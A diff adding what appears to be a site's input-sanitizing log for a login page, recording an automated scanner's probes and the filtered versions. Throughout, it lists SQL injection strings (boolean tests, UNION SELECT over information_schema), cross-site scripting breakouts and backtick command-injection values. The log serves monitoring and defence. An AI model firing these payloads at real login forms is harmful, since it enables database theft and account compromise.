@@ -1,0 +1,324 @@
+Date: 28-07-2015 12:50:08 PM IP: 43.245.149.43 User : Not loggedin Code: Joey" AND 1=1 -- , Fixed: Joey AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:08 PM IP: 43.245.149.43 User : Not loggedin Code: Joey' AND 1=2 -- , Fixed: Joey AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:08 PM IP: 43.245.149.43 User : Not loggedin Code: Joey' AND 1=1 -- , Fixed: Joey AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:08 PM IP: 43.245.149.43 User : Not loggedin Code: Joey'"'"'"'", Fixed: Joey, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:08 PM IP: 43.245.149.43 User : Not loggedin Code: Joey\\'\\", Fixed: Joey, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:08 PM IP: 43.245.149.43 User : Not loggedin Code: Joey'", Fixed: Joey, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:08 PM IP: 43.245.149.43 User : Not loggedin Code: Joey''''"""", Fixed: Joey, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:08 PM IP: 43.245.149.43 User : Not loggedin Code: Joey\'\", Fixed: Joey, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:08 PM IP: 43.245.149.43 User : Not loggedin Code: vega>'>"><vega></vega>, Fixed: vegavega/vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:09 PM IP: 43.245.149.43 User : Not loggedin Code: Joey`uname`, Fixed: Joeyuname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:09 PM IP: 43.245.149.43 User : Not loggedin Code: Joey`false`, Fixed: Joeyfalse, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:09 PM IP: 43.245.149.43 User : Not loggedin Code: Joey`true`, Fixed: Joeytrue, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: ' -->">'>'"<vvv000415v045225>, Fixed:  --vvv000415v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: ' style=vvv000413v045225, Fixed:  style=vvv000413v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: ' onMouseOver=vvv000412v045225, Fixed:  onMouseOver=vvv000412v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: " style=vvv000411v045225, Fixed:  style=vvv000411v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: " onMouseOver=vvv000410v045225, Fixed:  onMouseOver=vvv000410v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: " -->">'>'"<vvv000414v045225>, Fixed:  --vvv000414v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: Joey*/ -->">'>'"<vvv000406v045225>, Fixed: Joey*/ --vvv000406v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: Joey' -->">'>'"<vvv000407v045225>, Fixed: Joey --vvv000407v045225, Link: http://www.a3ultimate.com/login.php
+
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: Joey src=-->">'>'"<vvv000404v045225>, Fixed: Joey src=--vvv000404v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: Joey" src=-->">'>'"<vvv000403v045225>, Fixed: Joey src=--vvv000403v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: Joey</textarea>-->">'>'"<vvv000402v045225>, Fixed: Joey/textarea--vvv000402v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: Joey.htaccess.aspx-->">'>'"<vvv000401v045225>, Fixed: Joey.htaccess.aspx--vvv000401v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: Joey-->">'>'"<vvv000400v045225>, Fixed: Joey--vvv000400v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: e' or 1 eq 1 or 'a' = 'a, Fixed: e or 1 eq 1 or a = a, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: e', Fixed: e, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:10 PM IP: 43.245.149.43 User : Not loggedin Code: " AND 1=2 -- , Fixed:  AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: " AND 1=1 -- , Fixed:  AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: ' AND 1=2 -- , Fixed:  AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: vega>'>"></vega><vega>, Fixed: vega/vegavega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: ' AND 1=1 -- , Fixed:  AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: Joey" UNION SELECT 8, table_name, 'vega' FROM information_schema.tables WHERE table_name like'%, Fixed: Joey UNION SELECT 8, table_name, vega FROM information_schema.tables WHERE table_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: Joey" UNION SELECT 8, table_name, 'vega' FROM information_schema.taables WHERE taable_name like'%, Fixed: Joey UNION SELECT 8, table_name, vega FROM information_schema.taables WHERE taable_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: Joey' UNION SELECT 8, table_name, 'vega' FROM information_schema.tables WHERE table_name like'%, Fixed: Joey UNION SELECT 8, table_name, vega FROM information_schema.tables WHERE table_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: Joey' UNION SELECT 8, table_name, 'vega' FROM information_schema.taables WHERE taable_name like'%, Fixed: Joey UNION SELECT 8, table_name, vega FROM information_schema.taables WHERE taable_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: Joey'', Fixed: Joey, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: Joey\', Fixed: Joey, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: Joey', Fixed: Joey, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: Joey" AND 1=2 -- , Fixed: Joey AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: " src=http://vega.invalid/;?, Fixed:  src=http://vega.invalid/;?, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: Joey\\'\\", Fixed: Joey, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: Joey'", Fixed: Joey, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:11 PM IP: 43.245.149.43 User : Not loggedin Code: Joey\'\", Fixed: Joey, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:13 PM IP: 43.245.149.43 User : Not loggedin Code: Joey'uname', Fixed: Joeyuname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:13 PM IP: 43.245.149.43 User : Not loggedin Code: Joey'false', Fixed: Joeyfalse, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:13 PM IP: 43.245.149.43 User : Not loggedin Code: Joey'true', Fixed: Joeytrue, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:13 PM IP: 43.245.149.43 User : Not loggedin Code: Joey"`uname`", Fixed: Joeyuname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:13 PM IP: 43.245.149.43 User : Not loggedin Code: Joey"`false`", Fixed: Joeyfalse, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:13 PM IP: 43.245.149.43 User : Not loggedin Code: Joey"`true`", Fixed: Joeytrue, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:13 PM IP: 43.245.149.43 User : Not loggedin Code: vega>'>"><vega></vega>, Fixed: vegavega/vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:14 PM IP: 43.245.149.43 User : Not loggedin Code: " -->">'>'"<vvv000430v045225>, Fixed:  --vvv000430v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:14 PM IP: 43.245.149.43 User : Not loggedin Code: ' -->">'>'"<vvv000431v045225>, Fixed:  --vvv000431v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:14 PM IP: 43.245.149.43 User : Not loggedin Code: ' style=vvv000429v045225, Fixed:  style=vvv000429v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:14 PM IP: 43.245.149.43 User : Not loggedin Code: ' onMouseOver=vvv000428v045225, Fixed:  onMouseOver=vvv000428v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:14 PM IP: 43.245.149.43 User : Not loggedin Code: " style=vvv000427v045225, Fixed:  style=vvv000427v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:14 PM IP: 43.245.149.43 User : Not loggedin Code: " onMouseOver=vvv000426v045225, Fixed:  onMouseOver=vvv000426v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega' -->">'>'"<vvv000423v045225>, Fixed: vega --vvv000423v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega*/ -->">'>'"<vvv000422v045225>, Fixed: vega*/ --vvv000422v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega
+ -->">'>'"<vvv000421v045225>, Fixed: vega
+ --vvv000421v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega src=-->">'>'"<vvv000420v045225>, Fixed: vega src=--vvv000420v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega" src=-->">'>'"<vvv000419v045225>, Fixed: vega src=--vvv000419v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega</textarea>-->">'>'"<vvv000418v045225>, Fixed: vega/textarea--vvv000418v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega.htaccess.aspx-->">'>'"<vvv000417v045225>, Fixed: vega.htaccess.aspx--vvv000417v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega-->">'>'"<vvv000416v045225>, Fixed: vega--vvv000416v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: e' or 1 eq 1 or 'a' = 'a, Fixed: e or 1 eq 1 or a = a, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: " AND 1=2 -- , Fixed:  AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: e', Fixed: e, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: " AND 1=1 -- , Fixed:  AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: ' AND 1=2 -- , Fixed:  AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: ' AND 1=1 -- , Fixed:  AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega" UNION SELECT 8, table_name, 'vega' FROM information_schema.tables WHERE table_name like'%, Fixed: vega UNION SELECT 8, table_name, vega FROM information_schema.tables WHERE table_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega" UNION SELECT 8, table_name, 'vega' FROM information_schema.taables WHERE taable_name like'%, Fixed: vega UNION SELECT 8, table_name, vega FROM information_schema.taables WHERE taable_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega' UNION SELECT 8, table_name, 'vega' FROM information_schema.tables WHERE table_name like'%, Fixed: vega UNION SELECT 8, table_name, vega FROM information_schema.tables WHERE table_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega', Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega'', Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega" AND 1=1 -- , Fixed: vega AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega' UNION SELECT 8, table_name, 'vega' FROM information_schema.taables WHERE taable_name like'%, Fixed: vega UNION SELECT 8, table_name, vega FROM information_schema.taables WHERE taable_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega\', Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega" AND 1=2 -- , Fixed: vega AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega' AND 1=1 -- , Fixed: vega AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega' AND 1=2 -- , Fixed: vega AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega'"'"'"'", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega\'\", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega''''"""", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega\\'\\", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:15 PM IP: 43.245.149.43 User : Not loggedin Code: vega'", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega\'\", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega'", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega\\'\\", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega>'>"></vega><vega>, Fixed: vega/vegavega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega'uname', Fixed: vegauname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega'false', Fixed: vegafalse, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega'true', Fixed: vegatrue, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega"`uname`", Fixed: vegauname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega"`false`", Fixed: vegafalse, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega"`true`", Fixed: vegatrue, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega`uname`, Fixed: vegauname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega`false`, Fixed: vegafalse, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:16 PM IP: 43.245.149.43 User : Not loggedin Code: vega`true`, Fixed: vegatrue, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega" UNION SELECT 8, table_name, 'vega' FROM information_schema.tables WHERE table_name like'%, Fixed: vega UNION SELECT 8, table_name, vega FROM information_schema.tables WHERE table_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega" UNION SELECT 8, table_name, 'vega' FROM information_schema.taables WHERE taable_name like'%, Fixed: vega UNION SELECT 8, table_name, vega FROM information_schema.taables WHERE taable_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega' UNION SELECT 8, table_name, 'vega' FROM information_schema.tables WHERE table_name like'%, Fixed: vega UNION SELECT 8, table_name, vega FROM information_schema.tables WHERE table_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega' UNION SELECT 8, table_name, 'vega' FROM information_schema.taables WHERE taable_name like'%, Fixed: vega UNION SELECT 8, table_name, vega FROM information_schema.taables WHERE taable_name like%, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega'', Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega', Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega\', Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega" AND 1=2 -- , Fixed: vega AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega" AND 1=1 -- , Fixed: vega AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega' AND 1=2 -- , Fixed: vega AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega' AND 1=1 -- , Fixed: vega AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega'"'"'"'", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega''''"""", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega\\'\\", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega'", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega>'>"></vega><vega>, Fixed: vega/vegavega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega\'\", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:17 PM IP: 43.245.149.43 User : Not loggedin Code: vega>'>"><vega></vega>, Fixed: vegavega/vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:18 PM IP: 43.245.149.43 User : Not loggedin Code: " src=http://vega.invalid/;?, Fixed:  src=http://vega.invalid/;?, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:18 PM IP: 43.245.149.43 User : Not loggedin Code: vega'false', Fixed: vegafalse, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:18 PM IP: 43.245.149.43 User : Not loggedin Code: vega'uname', Fixed: vegauname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:18 PM IP: 43.245.149.43 User : Not loggedin Code: vega"`uname`", Fixed: vegauname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:18 PM IP: 43.245.149.43 User : Not loggedin Code: vega'true', Fixed: vegatrue, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:18 PM IP: 43.245.149.43 User : Not loggedin Code: vega"`false`", Fixed: vegafalse, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:18 PM IP: 43.245.149.43 User : Not loggedin Code: vega"`true`", Fixed: vegatrue, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:18 PM IP: 43.245.149.43 User : Not loggedin Code: vega`uname`, Fixed: vegauname, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: vega`false`, Fixed: vegafalse, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: vega`true`, Fixed: vegatrue, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: ' -->">'>'"<vvv000447v045225>, Fixed:  --vvv000447v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: " -->">'>'"<vvv000446v045225>, Fixed:  --vvv000446v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: ' style=vvv000445v045225, Fixed:  style=vvv000445v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: ' onMouseOver=vvv000444v045225, Fixed:  onMouseOver=vvv000444v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: " style=vvv000443v045225, Fixed:  style=vvv000443v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: " onMouseOver=vvv000442v045225, Fixed:  onMouseOver=vvv000442v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: vega' -->">'>'"<vvv000439v045225>, Fixed: vega --vvv000439v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: vega*/ -->">'>'"<vvv000438v045225>, Fixed: vega*/ --vvv000438v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: vega" src=-->">'>'"<vvv000435v045225>, Fixed: vega src=--vvv000435v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: vega</textarea>-->">'>'"<vvv000434v045225>, Fixed: vega/textarea--vvv000434v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: vega src=-->">'>'"<vvv000436v045225>, Fixed: vega src=--vvv000436v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: vega.htaccess.aspx-->">'>'"<vvv000433v045225>, Fixed: vega.htaccess.aspx--vvv000433v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: vega
+ -->">'>'"<vvv000437v045225>, Fixed: vega
+ --vvv000437v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: vega-->">'>'"<vvv000432v045225>, Fixed: vega--vvv000432v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: e' or 1 eq 1 or 'a' = 'a, Fixed: e or 1 eq 1 or a = a, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: e', Fixed: e, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:19 PM IP: 43.245.149.43 User : Not loggedin Code: " AND 1=2 -- , Fixed:  AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:20 PM IP: 43.245.149.43 User : Not loggedin Code: " AND 1=1 -- , Fixed:  AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:20 PM IP: 43.245.149.43 User : Not loggedin Code: ' AND 1=2 -- , Fixed:  AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:20 PM IP: 43.245.149.43 User : Not loggedin Code: ' AND 1=1 -- , Fixed:  AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:21 PM IP: 43.245.149.43 User : Not loggedin Code: " src=http://vega.invalid/;?, Fixed:  src=http://vega.invalid/;?, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:21 PM IP: 43.245.149.43 User : Not loggedin Code: vega\\'\\", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:21 PM IP: 43.245.149.43 User : Not loggedin Code: vega'", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:21 PM IP: 43.245.149.43 User : Not loggedin Code: vega\'\", Fixed: vega, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:24 PM IP: 43.245.149.43 User : Not loggedin Code: http://www.a3ultimate.com/ACP/-->">'>'"<vvv000464v045225>, Fixed: http://www.a3ultimate.com/ACP/--vvv000464v045225, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:24 PM IP: 43.245.149.43 User : Not loggedin Code: e', Fixed: e, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:24 PM IP: 43.245.149.43 User : Not loggedin Code: e' or 1 eq 1 or 'a' = 'a, Fixed: e or 1 eq 1 or a = a, Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:24 PM IP: 43.245.149.43 User : Not loggedin Code: " AND 1=1 -- , Fixed:  AND 1=1 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:24 PM IP: 43.245.149.43 User : Not loggedin Code: " AND 1=2 -- , Fixed:  AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
+Date: 28-07-2015 12:50:24 PM IP: 43.245.149.43 User : Not loggedin Code: ' AND 1=2 -- , Fixed:  AND 1=2 -- , Link: http://www.a3ultimate.com/login.php
